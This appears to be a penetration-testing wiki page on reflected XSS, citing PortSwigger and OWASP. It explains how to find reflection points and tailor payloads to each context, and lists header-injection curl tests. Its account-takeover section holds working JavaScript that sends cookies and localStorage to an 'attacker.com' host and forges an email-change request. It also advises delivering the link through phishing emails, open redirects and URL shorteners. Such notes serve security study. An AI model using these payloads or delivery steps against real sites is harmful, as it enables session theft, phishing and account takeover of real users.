# Reflected XSS

← [[XSS-Overview]]

---

Reflected XSS is when your payload is in the request (usually the URL) and immediately reflected back in the response. It doesn't persist — the victim has to click a crafted link for it to execute.

---

## How It Works

```
1. Attacker crafts URL: https://example.com/search?q=<script>alert(1)</script>
2. Victim clicks the link
3. Server returns: <p>Results for: <script>alert(1)</script></p>
4. Browser executes the injected script in the context of example.com
```

---

## Finding Reflected XSS

### Step 1 — Map Reflection Points

Look for every place user input appears in the response. Common locations:
- Search queries: `?q=test`, `?search=test`
- Error messages: "No results for `<your input>`"
- User profile fields shown back on confirmation pages
- URL path segments reflected in breadcrumbs
- HTTP headers reflected in the response (User-Agent, Referer, custom headers)

### Step 2 — Identify the Context

Send a unique string (`XSS_PROBE_1234`) and search for it in the response source.

```html
<!-- Context 1: HTML body -->
<p>Results for: XSS_PROBE_1234</p>

<!-- Context 2: HTML attribute -->
<input value="XSS_PROBE_1234">

<!-- Context 3: JavaScript string -->
<script>var q = 'XSS_PROBE_1234';</script>

<!-- Context 4: URL attribute -->
<a href="/search?q=XSS_PROBE_1234">
```

### Step 3 — Craft the Payload for the Context

| Context | Payload |
|---------|---------|
| HTML body | `<img src=x onerror=alert(1)>` |
| Double-quoted attribute | `" onmouseover="alert(1)` |
| Single-quoted attribute | `' onmouseover='alert(1)` |
| JS string (single-quoted) | `'-alert(1)-'` or `';alert(1)//` |
| URL attribute | `javascript:alert(1)` |

### Step 4 — Check Encoding

Is the server encoding your input? Look for:
- `<` → `&lt;` — HTML encoding (breaks most payloads)
- `'` → `\'` — JavaScript escaping (try `\';` to escape)
- Your payload URL-decoded or double-encoded

---

## Escalating to Account Takeover

Once you've confirmed XSS with `alert(1)`, escalate:

```javascript
// Cookie theft
fetch('https://attacker.com/steal?c='+document.cookie)

// Or using img tag (no CORS issue)
new Image().src='https://attacker.com/?c='+document.cookie

// Make authenticated requests (CSRF bypass)
fetch('/api/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
})

// Steal localStorage (tokens stored there)
fetch('https://attacker.com/?ls='+btoa(JSON.stringify(localStorage)))
```

---

## Delivering the Payload

Options to get the victim to click:
- Direct link in phishing email
- Link posted in comments/forum (if target has one)
- Open redirect chain: `https://example.com/redirect?to=https://example.com/xss?q=<payload>`
- URL shortener to hide the ugly URL

---

## Encoding Tricks for the URL

When putting XSS payloads in URLs:

```bash
# URL encode the payload
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))"
# → %3Cscript%3Ealert%281%29%3C%2Fscript%3E

# Double URL encode (for apps that decode twice)
# < = %25%3C after double encoding
```

---

## Reflected XSS in HTTP Headers

Sometimes less obvious — the app reflects your header value back into the page.

```bash
# Test with User-Agent
curl -sH 'User-Agent: <script>alert(1)</script>' https://example.com/log-viewer

# Test with custom headers
curl -sH 'X-Forwarded-For: <script>alert(1)</script>' https://example.com

# Referer header
curl -se -H 'Referer: <script>alert(1)</script>' https://example.com/tracking
```

---

*Back to [[XSS-Overview]] | Related: [[Stored-XSS]] | [[DOM-XSS]] | [[XSS-Filter-Bypass]]*

*Sources: PortSwigger Web Security Academy, OWASP Testing Guide v4*
